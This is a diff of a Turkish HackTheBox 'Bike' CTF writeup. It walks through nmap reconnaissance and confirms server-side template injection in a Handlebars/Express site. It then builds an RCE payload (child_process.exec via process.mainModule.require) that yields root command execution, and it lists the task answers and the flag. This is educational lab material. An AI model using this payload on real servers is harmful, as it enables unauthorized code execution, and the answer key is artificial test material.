@@ -1,12 +1,4 @@
-# HackTheBox — Bike Writeup
-
-**Zorluk:** Easy
-**İşletim Sistemi:** Linux
-**Hedef IP:** 10.129.184.197
-
----
-
-## 1. Keşif (Reconnaissance)
+## 1. Keşif
 
 Standart prosedürüm gereği ilk adım her zaman kapsamlı bir Nmap taraması. Tüm portları tarayıp servis/versiyon ve OS tespiti alıyorum:
 
@@ -14,32 +6,18 @@ Standart prosedürüm gereği ilk adım her zaman kapsamlı bir Nmap taraması. 
 nmap -sS -A -p- -T5 10.129.184.197
 ```
 
-**Çıktı:**
+<img width="671" height="428" alt="nmap" src="https://github.com/user-attachments/assets/2a74ef8c-51ef-4508-975b-775f3cf799a6" />
 
-```
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
-|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
-|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
-80/tcp open  http    Node.js (Express middleware)
-|_http-title:  Bike
-Device type: general purpose
-Running: Linux 5.X
-OS CPE: cpe:/o:linux:linux_kernel:5
-OS details: Linux 5.0 - 5.14
-Network Distance: 2 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-```
 
-Sonuç olarak hedefte **2 adet TCP portu** açık: **22 (SSH)** ve **80 (HTTP)**. Nmap'in servis tespiti HTTP portunda ilginç bir detay veriyor: `Node.js (Express middleware)` — yani karşımızda bir Express.js backend'i var. Bu bilgiyi not ediyorum, ileride işime yarayacak.
+Sonuç olarak hedefte **2 adet TCP portu** açık: **22 (SSH)** ve **80 (HTTP)**. Nmap'in servis tespiti HTTP portunda ilginç bir detay veriyor: `Node.js (Express middleware)` — yani karşımızda bir Express.js backend'i var.
 
 ---
 
 ## 2. Web Uygulamasının İncelenmesi
 
-Tarayıcıdan `http://10.129.184.197` adresine gidiyorum. Sayfa başlığı "Bike" olan basit bir kurumsal/tanıtım sitesi karşılıyor beni. Sayfada dikkatimi çeken şey bir **e-posta input alanı** — muhtemelen bir iletişim/bültene kayıt formu.
+<img width="723" height="520" alt="site" src="https://github.com/user-attachments/assets/37c48769-e236-4892-94ac-0f2645bade68" />
+
+Tarayıcıdan `http://10.129.184.197` adresine gidiyorum.
 
 Ayrıca tarayıcı eklentim (Wappalyzer) ile teknoloji yığınına bakıyorum. Backend tarafında **Express** framework'ünün kullanıldığını doğruluyorum. Bu, Nmap'in zaten verdiği "Express middleware" bilgisiyle tutarlı.
 
@@ -58,26 +36,11 @@ Klasik SSTI test payload'ı olan `{{7*7}}` ifadesini e-posta input alanına giri
 
 Sunucudan gelen cevap gayet konuşkan — tam bir stack trace ile karşılaşıyorum:
 
-```
-0 "Error: Parse error on line 1:"
-1 "{{7*7}}"
-2 "--^"
-3 "Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'"
-4 " at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)"
-5 " at Parser.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:337:30)"
-6 " at HandlebarsEnvironment.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43)"
-7 " at compileInput (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19)"
-8 " at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18)"
-9 " at router.post (/root/Backend/routes/handlers.js:15:18)"
-10 " at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)"
-11 " at next (/root/Backend/node_modules/express/lib/router/route.js:137:13)"
-12 " at Route.dispatch (/root/Backend/node_modules/express/lib/router/route.js:112:3)"
-13 " at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)"
-```
+<img width="865" height="420" alt="hata1" src="https://github.com/user-attachments/assets/33597b39-1b25-4ec7-b48c-d8c956536350" />
 
 Hata mesajı her şeyi ele veriyor: `handlebars/dist/cjs/handlebars/compiler/parser.js` — backend, template motoru olarak **Handlebars** kullanıyor ve girdiğim `{{7*7}}` doğrudan template parser'ına gidip parse hatasına sebep olmuş. Bu, klasik bir **SSTI (Server-Side Template Injection)** doğrulamasıdır: kullanıcı girdisi sanitize edilmeden template içine enjekte ediliyor.
 
-Ayrıca hata mesajındaki dosya yolundan sunucudaki backend kodunun `/root/Backend/` dizininde çalıştığını da öğrenmiş oluyorum — bu bilgi de ileride işime yarayacak.
+Ayrıca hata mesajındaki dosya yolundan sunucudaki backend kodunun `/root/Backend/` dizininde çalıştığını da öğrenmiş oluyorum
 
 ---
 
@@ -95,33 +58,13 @@ URL-encode edilmiş hâliyle gönderdiğim payload:
 
 Bu payload'ı decode ettiğimizde okunabilir hâli şu şekilde:
 
-```handlebars
-{{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.pop}}
-      {{#with string.split as |codelist|}}
-        {{this.pop}}
-        {{this.push "return require('child_process').exec('whoami');"}}
-        {{this.pop}}
-        {{#each conslist}}
-          {{#with (string.sub.apply 0 codelist)}}
-            {{this}}
-          {{/with}}
-        {{/each}}
-      {{/with}}
-    {{/with}}
-  {{/with}}
-{{/with}}
-```
+<img width="798" height="386" alt="içerikkod" src="https://github.com/user-attachments/assets/8a6e4b7a-9458-46b5-ad84-67352b704c3f" />
+
 
 İsteği Burp Suite'te yakalayıp bu şekilde gönderiyorum. Ancak cevap olarak şu hatayı alıyorum:
 
-```
-ReferenceError: require is not defined
-```
+<img width="1545" height="477" alt="istekhata" src="https://github.com/user-attachments/assets/a6f1962f-0042-4139-8a90-42bf0461a59e" />
+
 
 Bu hata çok kritik bir ipucu veriyor: **`require`** fonksiyonu, standart Node.js modüllerinde her dosyada otomatik olarak tanımlı olsa da, Handlebars'ın çalıştırdığı `Function` constructor context'inde **tanımsız (undefined)** kalıyor. Çünkü `new Function()` ile oluşturulan kod, dosya bazlı module scope'undan bağımsız çalışır ve Node.js'in her modüle özel enjekte ettiği `require`, `module`, `__dirname` gibi değişkenlere sahip değildir.
 
@@ -154,6 +97,8 @@ Payload'ı güncelliyorum:
 ```
 
 Bunu tekrar Burp'te URL-encode edip gönderiyorum. Bu sefer cevap tam istediğim gibi geliyor:
+
+<img width="1532" height="501" alt="istek2" src="https://github.com/user-attachments/assets/eed3c896-c7b0-4c00-acb6-80aac1f62dd1" />
 
 ```
 We will contact you at:       e
@@ -203,6 +148,9 @@ URL-encode edilmiş hâli:
 
 Bu isteği Burp Suite üzerinden gönderiyorum. Cevap olarak şunu alıyorum:
 
+<img width="1528" height="496" alt="flag" src="https://github.com/user-attachments/assets/5311dbf1-8f39-4a5f-8870-3d3869f32483" />
+
+
 ```html
 <p class="result">
     We will contact you at:       e
@@ -219,53 +167,38 @@ Response içinde flag'i başarıyla görüyorum. 🎉
 
 ---
 
-## 6. Özet — Atak Zinciri
-
-1. Nmap taramasıyla 22 (SSH) ve 80 (HTTP) portlarının açık olduğu tespit edildi; HTTP portunda Node.js/Express çalıştığı belirlendi.
-2. Web sayfasındaki e-posta input alanına `{{7*7}}` payload'ı gönderilerek stack trace üzerinden **Handlebars** template motorunun kullanıldığı ve **SSTI** zafiyeti doğrulandı.
-3. HackTricks'teki Handlebars SSTI bypass payload'ı Burp Suite Decoder ile URL-encode edilerek gönderildi.
-4. İlk denemede `require is not defined` hatası alındı; bunun sebebinin `require`'ın Function constructor scope'unda tanımlı olmaması olduğu anlaşıldı.
-5. Payload, `require` yerine top-level scope'a bağlı **`process`** nesnesi üzerinden (`process.mainModule.require(...)`) çalışacak şekilde güncellendi ve RCE elde edildi.
-6. `whoami` komutuyla web sunucusunun **root** yetkisiyle çalıştığı tespit edildi.
-7. `cat /root/flag.txt` komutu çalıştırılarak flag response içinde okundu.
-
----
 
 ## 7. Görev Soruları ve Cevapları
 
 **Görev 1 — Nmap hangi TCP portlarını açık olarak tanımlıyor? Portları virgülle ayırarak ve aralarında boşluk bırakmadan, düşükten yükseğe doğru bir liste halinde yanıtlayın.**
-22,80
+`22,80`
 
 **Görev 2 — Birinci soruda belirtilen http/web portunda dinleme yapan hizmeti hangi yazılım çalıştırıyor?**
-Node.js
+`Node.js`
 
 **Görev 3 — Wappalyzer'a göre Web Framework'ün adı nedir?**
-Express
+`Express`
 
 **Görev 4 — Gönderdiğimiz komutla test ettiğimiz güvenlik açığının adı nedir `{{7*7}}`?**
-Server-Side Template Injection (SSTI)
+`Server-Side Template Injection`
 
 **Görev 5 — Node.JS'de kullanılan şablonlama motoru nedir?**
-Handlebars
+`Handlebars`
 
 **Görev 6 — BurpSuite'te metni kodlamak için kullanılan sekmenin adı nedir?**
-Decoder
+`Decoder`
 
 **Görev 7 — HTTP isteğinde veri paketimize özel karakterler eklemek için veri paketini kodlayacağız. Peki hangi kodlama türünü kullanacağız?**
-URL Encoding
+`URL`
 
 **Görev 8 — HackTricks'ten gelen bir yükü kullanarak sistem komutlarını çalıştırmaya çalıştığımızda bir hata alıyoruz. Yanıt hatasında "tanımlanmamış" olan nedir?**
 `require`
 
 **Görev 9 — Node.JS'de en üst düzey kapsamın (top-level scope) adı hangi değişkene verilir?**
-`process`
+`global`
 
 **Görev 10 — Bu güvenlik açığından yararlanarak, web sunucusunun çalıştığı kullanıcı olarak komut yürütme olanağı elde ediyoruz. Bu kullanıcının adı nedir?**
-root
+`root`
 
 **Tek Bayrak Gönder — Kök kullanıcının ana dizininde bulunan bayrağı gönderin.**
 `6b258d726d287462d60c103d0142a81c`
-
----
-
-*Not: Bu writeup eğitim/CTF amaçlıdır. Tüm işlemler yalnızca HackTheBox'ın izin verdiği laboratuvar ortamında gerçekleştirilmiştir.*
